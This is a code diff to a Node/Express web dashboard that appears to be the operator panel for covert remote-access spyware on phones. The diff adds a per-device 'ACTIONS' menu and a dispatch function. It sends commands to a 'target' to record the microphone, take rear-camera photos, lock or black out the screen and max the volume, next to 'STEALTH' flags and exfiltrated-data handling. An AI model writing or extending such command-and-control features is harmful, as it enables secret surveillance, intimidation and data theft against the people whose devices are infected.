@@ -350,7 +350,19 @@ app.get('/', (req, res) => {
                 <td style="vertical-align: middle;">${statusBadge}</td>
                 <td style="vertical-align: middle;">${d.stealth ? '<span style="color:var(--neon-orange)">STEALTH</span>' : '<span style="color:var(--neon-green)">NORMAL</span>'}</td>
                 <td style="font-size: 0.72rem; color: #aaa; vertical-align: middle;">${formatTime(d.lastSeen)}</td>
-                <td style="vertical-align: middle;"><a href="/proxy/?deviceId=${encodeURIComponent(d.deviceId)}" target="_blank" style="background: var(--neon-cyan); color: #000; padding: 6px 14px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.7rem; display: inline-block;">CONNECT</a></td>
+                <td style="vertical-align: middle; white-space: nowrap;">
+                    <div style="display: inline-flex; align-items: center; gap: 6px;">
+                        <a href="/proxy/?deviceId=${encodeURIComponent(d.deviceId)}" target="_blank" style="background: var(--neon-cyan); color: #000; padding: 5px 10px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.65rem; display: inline-block;">CONNECT</a>
+                        <select onchange="dispatchQuickCommand('${d.deviceId}', this.value); this.selectedIndex=0;" style="background: rgba(0,242,255,0.08) !important; color: var(--neon-cyan) !important; border: 1px solid var(--neon-cyan) !important; font-size: 0.65rem !important; padding: 4px 6px !important; border-radius: 6px !important; cursor: pointer; outline: none; width: auto !important; height: auto !important;">
+                            <option value="" disabled selected>⚡ ACTIONS</option>
+                            <option value="mic">🎙️ Record Mic (60s)</option>
+                            <option value="blackout">🕶️ Toggle Blackout</option>
+                            <option value="lock">🔒 Toggle Lock</option>
+                            <option value="volume">🔊 Max Vol + Vibrate</option>
+                            <option value="photo">📷 Quick Photo (Rear)</option>
+                        </select>
+                    </div>
+                </td>
             </tr>
             `;
         }).join('');
@@ -466,6 +478,41 @@ app.get('/', (req, res) => {
             })
             .catch(err => alert('Network error updating device name.'));
         }
+    }
+
+    function dispatchQuickCommand(deviceId, action) {
+        if (!action) return;
+
+        let path = '/';
+        let label = '';
+
+        if (action === 'mic') {
+            path = '/audio/mic/start?duration=60';
+            label = 'Record Mic (60s)';
+        } else if (action === 'blackout') {
+            path = '/ghost/interact?action=blackout';
+            label = 'Toggle Blackout';
+        } else if (action === 'lock') {
+            path = '/ghost/lock';
+            label = 'Toggle System Lock';
+        } else if (action === 'volume') {
+            path = '/device/max-volume';
+            label = 'Max Volume & Alarm';
+        } else if (action === 'photo') {
+            path = '/camera/photo?cam=0';
+            label = 'Quick Photo (Rear)';
+        }
+
+        const fullUrl = \`/proxy\${path}\${path.includes('?') ? '&' : '?'}deviceId=\${encodeURIComponent(deviceId)}\`;
+        fetch(fullUrl)
+            .then(r => {
+                if (r.ok) {
+                    alert(\`[⚡ TACTICAL DISPATCH SUCCESS]\\nCommand "\${label}" dispatched to target.\`);
+                } else {
+                    alert(\`[!] Dispatch status \${r.status}\`);
+                }
+            })
+            .catch(err => alert('Network error dispatching quick command.'));
     }
 
     function deleteExfil(id) {
